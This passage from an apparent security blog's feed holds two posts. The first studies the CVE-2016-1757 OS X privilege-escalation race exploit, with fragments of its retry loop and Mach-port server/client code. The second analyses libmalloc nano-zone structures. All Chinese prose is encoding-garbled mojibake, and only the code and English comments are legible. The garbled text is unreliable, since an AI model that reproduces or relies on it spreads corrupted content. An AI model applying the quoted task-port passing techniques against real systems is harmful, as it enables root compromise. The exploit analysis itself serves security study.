class="line">      <span class="keyword">if</span> (tries &gt; max_tries) &#123;</span><br><span class="line">        FAIL(<span class="string">"either didn't win the race (try again) or we won but the child didn't exit cleanly with a 0 return code"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      LOG(<span class="string">"trying again..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸€ä¸ª<code>saved_special_port</code>å®Œæˆäº†ï¼Œçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¹‹é—´çš„<code>port</code>ä¼ é€’ï¼Œä»è€Œä½¿å¾—çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å…±äº«åŒä¸€ä¸ª<code>port</code>ï¼Œå­è¿›ç¨‹å†é€šè¿‡å…±äº«çš„<code>port</code>ï¼Œå°†è‡ªèº«çš„<code>task</code>çš„<code>port</code>å‘é€ç»™çˆ¶è¿›ç¨‹å¹¶æœ€ç»ˆåœ¨çˆ¶è¿›ç¨‹ä¸­å®ç°å¯¹å­è¿›ç¨‹ä»£ç æ®µä¿®æ”¹ï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼Œè¯¦æƒ…è§<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">è¿™é‡Œ</a>ã€‚</p>
<h3 id="2-2_è§£æ">2.2 è§£æ</h3><ol>
<li>çˆ¶è¿›ç¨‹é€šè¿‡<code>task_get_special_port</code>è·å–ä»–çš„<code>special ports</code>ï¼Œå¹¶å­˜å‚¨åœ¨å±€éƒ¨å˜é‡ä¸­ã€‚<code>special ports</code>æ˜¯ä¸€äº›è¿æ¥ç€ç³»ç»ŸæœåŠ¡çš„<code>port</code>ï¼Œåœ¨<code>fork</code>çš„è¿‡ç¨‹ä¸­ï¼Œå­è¿›ç¨‹ä¼šç»§æ‰¿<code>special port</code>ã€‚</li>
<li>çˆ¶è¿›ç¨‹é€šè¿‡<code>mach_port_allocate</code>å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„<code>port</code>ï¼Œé€šè¿‡<code>task_set_special_port</code>å°†è¿™ä¸ªæ–°çš„<code>port</code>è®¾ä¸º<code>special port</code>ï¼Œä¸”é€šè¿‡<code>mach_port_insert_right</code>ä¸ºè¿™ä¸ªæ–°çš„<code>port</code>èµ‹äºˆå†™çš„æƒé™ã€‚å¹¶æœ€ç»ˆè¯•å›¾å°†è¿™ä¸ªæ–°çš„<code>port</code>ä¼ é€’ç»™å­è¿›ç¨‹ã€‚</li>
<li>çˆ¶è¿›ç¨‹è¿›è¡Œ<code>fork</code>ï¼Œå­è¿›ç¨‹ç»§æ‰¿äº†<em>[2]</em>ä¸­åˆ›å»ºçš„æ–°çš„<code>port</code>ï¼Œä½œä¸ºè‡ªå·±çš„<code>special port</code>ã€‚</li>
<li>çˆ¶è¿›ç¨‹å°†ä¿å­˜çš„åœ¨ä¸´æ—¶å˜é‡ä¸­çš„<code>special port</code>ï¼Œé‡æ–°è®¾ç½®å›æ¥ã€‚</li>
<li>å­è¿›ç¨‹è·å–è¿™ä¸ªæ›¿æ¢è¿‡çš„<code>special port</code>ï¼Œå¹¶ä¸”ä¿å­˜ä¸‹æ¥ã€‚</li>
<li>å­è¿›ç¨‹é€šè¿‡ç»§æ‰¿çš„<code>special port</code>å’Œçˆ¶è¿›ç¨‹é€šä¿¡ã€‚</li>
<li>çˆ¶è¿›ç¨‹åœ¨æ”¶åˆ°å­è¿›ç¨‹çš„æ¶ˆæ¯åï¼Œå°†å½“å‰çš„<code>special port</code>å†å‘é€ç»™å­è¿›ç¨‹ã€‚</li>
<li>å­è¿›ç¨‹ä¹Ÿå°†æ”¶åˆ°çš„<code>special port</code>è®¾ç½®ä¸ºè‡ªå·±çš„<code>special port</code>ã€‚</li>
</ol>
<p>æ—¶åºå›¾å¤§è‡´å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-1757/port_dance.png" alt="port dance"></p>
<p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥å¾—çŸ¥ï¼Œå†åˆ©ç”¨è¿™ä¸ªæ¼æ´çš„æ—¶å€™ï¼Œæˆ‘ä»¬æƒ³è¦çš„å°±æ˜¯ä¸€ä¸ªçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹å…±åŒæŒæœ‰ï¼Œä¸”å¯ä»¥ç”¨æ¥äº¤æµçš„<code>port</code>ï¼Œé€šè¿‡è¿™ä¸ª<code>port</code>ï¼Œå­è¿›ç¨‹å¯ä»¥å°†è‡ªå·±çš„<code>task port</code>äº¤ç»™å¦å¤–ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™é‡Œæ˜¯çˆ¶è¿›ç¨‹ï¼Œæ¥å®ç°æ¼æ´çš„åˆ©ç”¨ã€‚</p>
<h1 id="0x03_server&amp;client">0x03 server&amp;client</h1><p>é‚£ä¹ˆæ–°çš„<code>EXP</code>ä½¿ç”¨äº†ä»€ä¹ˆæ–¹æ³•å®ç°çš„å‘¢ï¼Ÿ</p>
<h2 id="3-1_bootstrap_register">3.1 bootstrap_register</h2><p>æ¯ä¸€ä¸ª<code>task</code>å¯ä»¥è°ƒç”¨<code>bootstrap_register()</code>å‡½æ•°ï¼Œå‘<code>bootstrap server</code>æ³¨å†Œä¸€ä¸ªæœåŠ¡ï¼Œé€šè¿‡ä¸€ä¸ªå­—ç¬¦ä¸²ä¸è‡ªå·±çš„<code>task port</code>ç›¸å…³è”ã€‚å…¶ä»–çš„<code>task</code>å¯ä»¥é€šè¿‡<code>bootstrap_look_up</code>å‡½æ•°æ¥é€šè¿‡å­—ç¬¦ä¸²æŸ¥è¯¢å¯¹åº”çš„<code>task</code>çš„<code>port</code>ã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜å°±ä¸€ç›®äº†ç„¶äº†ã€‚</p>
<ul>
<li>å»ºäº†ä¸€ä¸ªè¿›ç¨‹Aï¼Œé€šè¿‡<code>bootstrap_register</code>æ³¨å†Œä¸€ä¸ªæœåŠ¡ã€‚</li>
<li>å»ºç«‹ä¸€ä¸ªè¿›ç¨‹Bï¼Œé€šè¿‡<code>bootstrap_look_up</code>è·å–è¿›ç¨‹Açš„<code>task port</code>ã€‚</li>
<li>è¿›ç¨‹Bé€šè¿‡è¿›ç¨‹Açš„<code>task port</code>å°†è‡ªå·±çš„<code>task port</code>å‘ŠçŸ¥è¿›ç¨‹Aã€‚</li>
<li>è¿›ç¨‹Aé€šè¿‡è¿›ç¨‹Bçš„<code>task port</code>é…åˆè¿›ç¨‹Bï¼Œå‡ºå‘æ¼æ´ã€‚</li>
</ul>
<p>â€‹    </p>
<h2 id="3-2_bootstrap_register2">3.2 bootstrap_register2</h2><p>è¿™ä¸ªæ–¹æ¡ˆè™½ç„¶ç®€å•æ˜äº†ï¼Œä½†æ˜¯ç¼ºæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œ<code>bootstrap_register</code>åœ¨10.5ä¹‹åçš„ç‰ˆæœ¬å°±æ²¡æœ‰äº†ã€‚</p>
<p>ä¸è¿‡ç½‘ä¸Šæœ‰ä¸ªä¸€ç®€å•çš„æ›¿ä»£æ–¹æ³•ï¼Œåœ¨-[NSMachBootstrapServer registerPort:name:]ä¸­å°è£…äº†ä¸€ä¸ª<code>bootstrap_register2</code>ï¼Œåªä¸è¿‡å¹¶æ²¡æœ‰å¯¼å‡ºåˆ°å¤–éƒ¨ï¼Œæ‰€ä»¥åªéœ€è¦æ·»åŠ ä¸€è¡Œä»£ç å°±å¯ä»¥ä½¿ç”¨<code>bootstrap_register2</code>æ¥å®Œæˆç›¸åº”çš„åŠŸèƒ½ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span><br><span class="line"> * this is not exported so we need to declare it</span><br><span class="line"> * we need to use this because bootstrap_create_server is broken in Yosemite</span><br><span class="line"> */</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> kern_return_t <span class="title">bootstrap_register2</span><span class="params">(mach_port_t bp, name_t service_name, mach_port_t sp, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<h2 id="3-3_å®é™…ä»£ç ">3.3 å®é™…ä»£ç </h2><p>æ‘˜å–åˆ©ç”¨ä»£ç ä¸­ç›¸å…³ä»£ç æ®µã€‚</p>
<p>mach_server.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* register the server with launchd */</span></span><br><span class="line">kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;server_port);</span><br><span class="line">   </span><br><span class="line">kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);</span><br><span class="line"></span><br><span class="line">kr = bootstrap_register2(bootstrap_port, SERVICE_NAME, server_port, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* alternative method to register with launchd */</span></span><br></pre></td></tr></table></figure>
<p>mach_client.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DEBUG_MSG(<span class="string">"Looking up server..."</span>);</span><br><span class="line">kr = bootstrap_look_up(bootstrap_port, SERVICE_NAME, &amp;server_port);</span><br><span class="line">EXIT_ON_MACH_ERROR(<span class="string">"bootstrap_look_up"</span>, kr, BOOTSTRAP_SUCCESS);</span><br><span class="line"></span><br><span class="line">kr = mach_port_allocate(mach_task_self(),        <span class="comment">// our task is acquiring</span></span><br><span class="line">                        MACH_PORT_RIGHT_RECEIVE, <span class="comment">// a new receive right</span></span><br><span class="line">                        &amp;client_port);           <span class="comment">// with this name</span></span><br></pre></td></tr></table></figure>
<h1 id="0x04_å°ç»“">0x04 å°ç»“</h1><p>æœ‰å…´è¶£çš„è¯»è€…å¯ä»¥ä»”ç»†é˜…è¯»<a href="https://github.com/gdbinit/mach_race" target="_blank" rel="external">fG!çš„åˆ©ç”¨</a>ï¼Œä¸ä¹‹å‰çš„åˆ©ç”¨ä»£ç çš„ä¸åŒä¹‹å¤„å¹¶ä¸æ­¢åœ¨<code>mach message</code>çš„åˆ©ç”¨è¿™ä¸€ç‚¹ä¸Šã€‚ä»¥åæœ‰æ—¶é—´è¿˜ä¼šåšå‡ºæ›´ç»†è‡´çš„åˆ†æã€‚</p>
<h1 id="å¼•ç”¨">å¼•ç”¨</h1><p>1.Inter-Process Communication</p>
<p><a href="http://nshipster.com/inter-process-communication/" target="_blank" rel="external">http://nshipster.com/inter-process-communication/</a></p>
<p>2.Debugging Mach Ports</p>
<p><a href="https://robert.sesek.com/2012/1/debugging_mach_ports.html" target="_blank" rel="external">https://robert.sesek.com/2012/1/debugging_mach_ports.html</a></p>
<p>3.Changes to XNU Mach IPC</p>
<p><a href="https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html" target="_blank" rel="external">https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html</a></p>
<p>4.A Little IPC Project</p>
<p><a href="http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html" target="_blank" rel="external">http://www.nongnu.org/hurdextras/ipc_guide/mach_ipc_basic_concepts.html</a></p>
<p>5.æ·±å…¥ç†è§£RunLoop</p>
<p><a href="http://blog.ibireme.com/2015/05/18/runloop/" target="_blank" rel="external">http://blog.ibireme.com/2015/05/18/runloop/</a></p>
<h1 id="PS">PS</h1><p>è¿™æ˜¯æˆ‘çš„å­¦ä¹ åˆ†äº«åšå®¢<a href="http://turingh.github.io/">http://turingh.github.io/</a></p>
<p>æ¬¢è¿å¤§å®¶æ¥æ¢è®¨ï¼Œä¸è¶³ä¹‹å¤„è¿˜è¯·æŒ‡æ­£ã€‚</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1757">CVE-2016-1757</a>æ˜¯ä¸€ä¸ª<code>OS X</code>ç³»ç»Ÿä¸Šé€šè¿‡æ¡ä»¶ç«äº‰å®ç°ä»»æ„ä»£ç åœ¨<code>root</code>æƒé™æ‰§è¡Œçš„æ¼æ´ã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œæˆ‘å·²ç»åˆ†æè¿‡äº†è¿™ä¸ªæ¼æ´çš„åŸç†ï¼Œä»¥åŠ<code>EXP</code>ä»£ç çš„å®ç°ã€‚</p>
<p><a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757ç®€å•åˆ†æ</a></p>
<p><a href="http://turingh.github.io/2016/04/19/CVE-2016-1757%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/">CVE-2016-1757åˆ©ç”¨ç¨‹åºåˆ†æ</a></p>
<p><a href="http://turingh.github.io/2016/04/13/%E5%88%A9%E7%94%A8patch%E7%BB%95%E8%BF%87kextload%E5%AF%B9%E5%86%85%E6%A0%B8%E7%AD%BE%E5%90%8D%E7%9A%84%E6%A3%80%E6%B5%8B/">åˆ©ç”¨patchç»•è¿‡kextloadå¯¹å†…æ ¸ç­¾åçš„æ£€æµ‹</a></p>
<p>åœ¨<code>syscan2016</code>ä¸Šåˆæœ‰å›½å¤–çš„å®‰å…¨ç ”ç©¶äººå‘˜æ”¾å‡ºè‡ªå·±çš„<a href="https://github.com/gdbinit/mach_race">åˆ©ç”¨ä»£ç </a>ã€‚å­¦ä¹ ä¹‹åï¼Œè¿™ä¸ªåˆ©ç”¨ä»£ç ç¡®å®æ¯”ä¹‹å‰çš„æ›´åŠ æ¸…æ™°ã€æ˜ç¡®ã€‚æ›´åŠ å®¹æ˜“ç†è§£ã€‚</p>
<p>è€Œä¸¤ä¸ªåˆ©ç”¨æœ¬è´¨ä¸Šé¢çš„ä¸åŒæ˜¯å¯¹<code>mach port</code>çš„ä¸åŒçš„åˆ©ç”¨æ–¹æ³•ã€‚ä¸‹é¢ä¸»è¦ç»“åˆä¸¤ä¸ªä¸åŒçš„POCï¼Œæ¥åˆ†æä¸€ä¸‹<code>mach message</code>çš„ä½¿ç”¨ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ç ”ç©¶<code>xnu</code>çš„<code>IPC</code>çš„åŸºç¡€ã€‚</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="execv" scheme="http://turingh.github.io/tags/execv/"/>
    
      <category term="ports" scheme="http://turingh.github.io/tags/ports/"/>
    
      <category term="race" scheme="http://turingh.github.io/tags/race/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/OS-X/CVE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[libmallocæºç åˆ†æä¹‹nanozone_sçš„å¤„ç†]]></title>
    <link href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8Bnanozone-s%E7%9A%84%E5%A4%84%E7%90%86/"/>
    <id>http://turingh.github.io/2016/06/28/libmallocæºç åˆ†æä¹‹nanozone-sçš„å¤„ç†/</id>
    <published>2016-06-29T02:11:53.000Z</published>
    <updated>2016-06-30T02:58:54.000Z</updated>
    <content type="html"><![CDATA[<h1 id="æ‘˜è¦">æ‘˜è¦</h1><p>æ ¹æ®ç”³è¯·å†…å­˜çš„å¤§å°ä¸åŒï¼Œ<code>libmalloc</code>ä¼šä»ä¸åŒçš„å †ä¸Šç©ºé—´å°†å†…å­˜åˆ†é…ç»™ç”³è¯·è€…ï¼Œè€Œæœ€å°çš„ä¸€ä¸ªä¸€æ¡£ï¼Œæ˜¯ä»<code>nano_zone_s</code>ä¸­ï¼Œé€šè¿‡<code>nano_*</code>å‡½æ•°è·å–å †ä¸Šå·²åˆ†é…çš„å†…å­˜ã€‚</p>
<a id="more"></a>
<h1 id="nano_zone_s">nano_zone_s</h1><p><code>nano_zone_s</code>çš„æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nanozone_s &#123;				<span class="comment">// vm_allocate()'d, so page-aligned to begin with.</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		basic_zone;		<span class="comment">// first page will be given read-only protection</span></span><br><span class="line">	<span class="keyword">uint8_t</span>			pad[PAGE_MAX_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">malloc_zone_t</span>)];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// remainder of structure is R/W (contains no function pointers)</span></span><br><span class="line">	<span class="comment">// page-aligned</span></span><br><span class="line">	<span class="keyword">struct</span> nano_meta_s		meta_data[NANO_MAG_SIZE][NANO_SLOT_SIZE]; <span class="comment">// max: NANO_MAG_SIZE cores x NANO_SLOT_SIZE slots for nano blocks &#123;16 .. 256&#125;</span></span><br><span class="line">	_malloc_lock_s			band_resupply_lock[NANO_MAG_SIZE];</span><br><span class="line">    <span class="keyword">uintptr_t</span>           band_max_mapped_baseaddr[NANO_MAG_SIZE];</span><br><span class="line">	<span class="keyword">size_t</span>			core_mapped_size[NANO_MAG_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span>			debug_flags;</span><br><span class="line">	<span class="keyword">unsigned</span>			our_signature;</span><br><span class="line">	<span class="keyword">unsigned</span>			phys_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			logical_ncpus;</span><br><span class="line">	<span class="keyword">unsigned</span>			hyper_shift;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* security cookie */</span></span><br><span class="line">	<span class="keyword">uintptr_t</span>			cookie;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * The nano zone constructed by create_nano_zone() would like to hand off tiny, small, and large</span><br><span class="line">	 * allocations to the default scalable zone. Record the latter as the "helper" zone here.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">malloc_zone_t</span>		*helper_zone;</span><br><span class="line">&#125; <span class="keyword">nanozone_t</span>;</span><br></pre></td></tr></table></figure>
<p>åœ¨<a href="http://turingh.github.io/2016/06/28/libmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B9%8B%E5%88%9D%E5%A7%8B%E5%8C%96/#szone_tã€nanozone_t">libmallocæºç åˆ†æä¹‹åˆå§‹åŒ–</a>ä¸­åšè¿‡ç®€å•çš„ä»‹ç»ï¼Œè¿™ä¸ªæ•°æ®ç»“æ„ä¸­ï¼Œä¸»è¦éœ€è¦ç†è§£çš„æ˜¯å‡ ä¸ªå®å’Œä¸€ä¸ªæ•°æ®ç»“æ„ã€‚</p>
<h2 id="ä¸€äº›éœ€è¦ç†è§£çš„å®å®šä¹‰">ä¸€äº›éœ€è¦ç†è§£çš„å®å®šä¹‰</h2><h3 id="NANO_MAX_SIZE">NANO_MAX_SIZE</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hexcolor">#def</span>ine NANO_MAX_SIZE			<span class="number">256</span> </span><br><span class="line"><span class="comment">/* Buckets sized &#123;16, 32, 48, 64, 80, 96, 112, ...&#125; */</span></span><br></pre></td></tr></table></figure>
<p>å®šä¹‰äº†<code>nano_zone</code>ä¸­å¯ä»¥ç”³è¯·çš„å†…å­˜å—çš„æœ€å¤§å€¼ä¸º256</p>
<h3 id="SLOT_IN_BAND_SIZE">SLOT_IN_BAND_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_OFFSET_BITS		<span class="number">17</span>	</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> SLOT_IN_BAND_SIZE 	(<span class="number">1</span> &lt;&lt; NANO_OFFSET_BITS)</span></span><br></pre></td></tr></table></figure>
<p><code>SLOT_IN_BAND_SIZE</code>çš„å€¼ä¸º2^17==128*1024,æ‰€ä»¥<code>SLOT_IN_BAND_SIZE</code>çš„å€¼ç­‰äº<code>128KB</code>ã€‚ç”¨æ¥è¡¨ç¤ºï¼Œåœ¨æ¯ä¸€ä¸ª<code>nano</code>å†…å­˜åˆ†é…çš„<code>BAND</code>ä¹‹ä¸­ï¼Œä¸€ä¸ªæ¯ä¸€ä¸ª<code>SLOT</code>çš„å¤§å°æ˜¯<code>128KB</code>ã€‚</p>
<h3 id="BAND_SIZE">BAND_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_BITS			<span class="number">4</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_OFFSET_BITS		<span class="number">17</span>	</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> BAND_SIZE 		(<span class="number">1</span> &lt;&lt; (NANO_SLOT_BITS + NANO_OFFSET_BITS)) </span></span><br><span class="line"><span class="comment">/*  == Number of bytes covered by a page table entry */</span></span><br></pre></td></tr></table></figure>
<p><code>BAND_SIZE</code>çš„å€¼ä¸º2^21==2*1024*1024,æ‰€ä»¥<code>BAND_SIZE</code>çš„å€¼ç­‰äº<code>2MB</code>ã€‚ç”¨æ¥è¡¨ç¤ºï¼Œåœ¨æ¯ä¸€ä¸ª<code>nano_zone_t</code>çš„åˆ†é…ä¸­ï¼Œæ¯ä¸€ä¸ªBANDçš„å¤§å°æ˜¯2MBã€‚</p>
<h3 id="NANO_MAG_SIZE">NANO_MAG_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_MAG_BITS            <span class="number">5</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_MAG_SIZE            (<span class="number">1</span> &lt;&lt; NANO_MAG_BITS)</span></span><br></pre></td></tr></table></figure>
<p><code>NANO_MAG_SIZE</code>çš„å€¼ä¸º2^5==32ï¼Œç”¨æ¥æœ€å¤šæ”¯æŒå¤šå°‘ä¸ªæ ¸ã€‚</p>
<h3 id="NANO_SLOT_SIZE">NANO_SLOT_SIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_BITS			<span class="number">4</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> NANO_SLOT_SIZE      	(<span class="number">1</span> &lt;&lt; NANO_SLOT_BITS)</span></span><br></pre></td></tr></table></figure>
<p>è¡¨ç¤ºä¸€å…±æœ‰2^4,ä¹Ÿå°±æ˜¯16ç§<code>SLOT</code>çš„å¤§å°ã€‚åˆ†åˆ«æ˜¯16,32,48,64,â€¦,256ã€‚</p>
<h2 id="nano_meta_s">nano_meta_s</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> nano_meta_s &#123;</span><br><span class="line">	OSQueueHead			slot_LIFO CACHE_ALIGN;</span><br><span class="line">  	<span class="comment">//ç”¨äºé‡å¤åˆ©ç”¨é‡Šæ”¾å†…å­˜çš„é˜Ÿåˆ—</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_madvised_log_page_count;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_current_base_addr;</span><br><span class="line">  	<span class="comment">//slotçš„åŸºå€</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_limit_addr;</span><br><span class="line">  	<span class="comment">//slotå¯ä»¥åˆ†é…çš„åœ°å€æœ€å¤§å€¼</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span>		slot_objects_mapped;</span><br><span class="line">  	<span class="comment">//slotä¸­å·²ç»æ˜ å°„äº†å¤šå°‘ä¸ªobjects</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span>		slot_objects_skipped;</span><br><span class="line">  	<span class="comment">//slotå¼€å§‹çš„æ—¶å€™ä¼šè·³è¿‡å¤šå°‘ä¸ªobjectå¼€å§‹ä½¿ç”¨</span></span><br><span class="line">	<span class="keyword">bitarray_t</span>			slot_madvised_pages;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uintptr_t</span>		slot_bump_addr CACHE_ALIGN; </span><br><span class="line">  	<span class="comment">//slotå½“å‰å¼€å§‹åˆ†é…çš„åœ°å€</span></span><br><span class="line">    <span class="comment">// position on cache line distinct from that of slot_LIFO</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">boolean_t</span>		slot_exhausted;</span><br><span class="line">  	<span class="comment">// slotæ˜¯å¦å·²ç»ç”¨å°½</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_bytes;</span><br><span class="line">  	<span class="comment">// è¯¥slotä¸­å­˜å‚¨çš„bytesæ˜¯å¤šå°‘(16ã€32ã€48...)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		slot_objects;</span><br><span class="line">  	<span class="comment">// è¯¥slotä¸­å­˜å‚¨äº†å¤šå°‘ä¸ªobject(slotæ€»å†…å­˜/slot_bytes)</span></span><br><span class="line">&#125; *<span class="keyword">nano_meta_admin_t</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ•°æ®ç»“æ„å°±æ˜¯<code>nano_zone_s</code>ä¸­çš„<code>meta_data</code>çš„æ•°æ®ç»“æ„ï¼Œå…·ä½“ç”¨æ¥æè¿°æ¯ä¸€ä¸ª<code>slot</code>çš„çŠ¶æ€å’Œå±æ€§ã€‚</p>
<h1 id="nano_malloc">nano_malloc</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc</span><span class="params">(size_t size)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">void</span>	*retval;</span><br><span class="line">	retval = malloc_zone_malloc(inline_malloc_default_zone(), size);</span><br><span class="line">	<span class="keyword">if</span> (retval == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		errno = ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span><br><span class="line"><span class="title">malloc_zone_malloc</span><span class="params">(malloc_zone_t *zone, size_t size)</span> 